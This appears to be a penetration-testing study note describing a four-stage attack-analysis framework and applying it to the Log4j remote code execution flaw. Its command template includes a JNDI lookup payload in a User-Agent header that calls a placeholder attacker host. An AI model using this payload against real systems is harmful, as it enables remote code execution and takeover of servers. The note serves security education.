# Concept of Attacks Framework

The **Concept of Attacks** is a structured methodology used to analyze, understand, and debug exploits across various services (e.g., **SSH**, **FTP**, **SMB**, **HTTP**). It provides a linear pattern to identify attack points by categorizing every vulnerability into four distinct stages,,.

---

### 1. Source

The **Source** is the origin of information or the specific request that triggers a vulnerability. This is the primary target for manipulation during an exploit,.

|Information Source|Description|
|:--|:--|
|**Code**|Results from already executed program code or functions.|
|**Libraries**|Resource collections (configuration, subroutines, classes) integrated into a program.|
|**Config**|Static values determining how a process handles information.|
|**APIs**|Interfaces used for retrieving or providing information between programs.|
|**User Input**|Manual entry of values by a person into a program function.|

---

### 2. Processes

The **Process** handles information forwarded from the **Source**. Vulnerabilities typically reside in the program code (classes, calculations, loops) that dictates how this data is processed.

|Component|Description|
|:--|:--|
|**PID**|The Process-ID identifies the running task and its associated privileges.|
|**Input**|Information assigned by a user or a programmed function.|
|**Data Processing**|Hard-coded functions that dictate how information is manipulated.|
|**Variables**|Placeholders used for further processing during a task.|
|**Logging**|Documentation of events stored in registers or files; often stays in the system.|

---

### 3. Privileges

**Privileges** are system-controlled permissions that determine what actions a process can perform. Attackers look for processes running with high privileges to achieve maximum system impact.

|Privilege Level|Description|
|:--|:--|
|**System**|Highest level (Windows: **SYSTEM**, Linux: **root**). Allows any modification.|
|**User**|Permissions assigned to a specific user account.|
|**Groups**|Categorization of users sharing specific permissions.|
|**Policies**|Application-specific commands applied to users or groups.|
|**Rules**|Permissions handled internally within an application.|

---

### 4. Destination

The **Destination** is the goal of the task, where data is either stored or forwarded. This can be local or remote.

|Destination|Description|
|:--|:--|
|**Local**|Environmental changes, such as modifying local files or records.|
|**Network**|Forwarding results to a remote interface, IP address, or service.|

---

### Operational Workflow: Log4j Case Study (CVE-2021-44228)

This workflow demonstrates how the framework is applied to a real-world **Remote Code Execution (RCE)** vulnerability.

**Initial Exploitation Cycle:**

1. **Manipulate Source:** Inject a **JNDI lookup** command into the **HTTP User-Agent header**,.
2. **Trigger Process:** The Log4j library misinterprets the string. Instead of logging it as text, it executes the command,.
3. **Leverage Privileges:** The command executes with **administrator/SYSTEM** privileges because the logging process requires high-level access to sensitive log locations,.
4. **Reach Destination:** The process performs a query to a remote server controlled by the attacker,.

**Second Cycle (RCE):**

1. **New Source:** The malicious Java class retrieved from the attacker's server becomes the new **Source**.
2. **New Process:** The system reads and executes the malicious code within the Java class.
3. **Execute with Privileges:** The code runs with the existing **administrator** permissions.
4. **Final Destination:** The code establishes a connection back to the attacker over the network, providing remote control of the target.

### Command Reference Template

_Note: Use this structure when analyzing or testing JNDI-based lookups._

|Parameter|Placeholder|
|:--|:--|
|Attacker Server|`<ATTACK_IP>`|
|Victim Machine|`<TARGET_IP>`|
|Target Port|`<PORT>`|

**Conceptual Command Structure:**

```
# Example of a JNDI lookup payload in a User-Agent header
User-Agent: ${jndi:ldap://<ATTACK_IP>:<PORT>/Exploit}
```

---

### Attack Implications

- **Methodology Use:** Apply this template to **source code analysis** to check functionality and commands step-by-step.
- **Decision Making:** Use the **Privileges** and **Destination** categories to prioritize which services to attack based on the potential for **SYSTEM** access or **Network** pivoting,.
- **Dangerous Configuration:** Applications running with **administrator** privileges to facilitate logging (as seen in Log4j) create high-impact targets for RCE.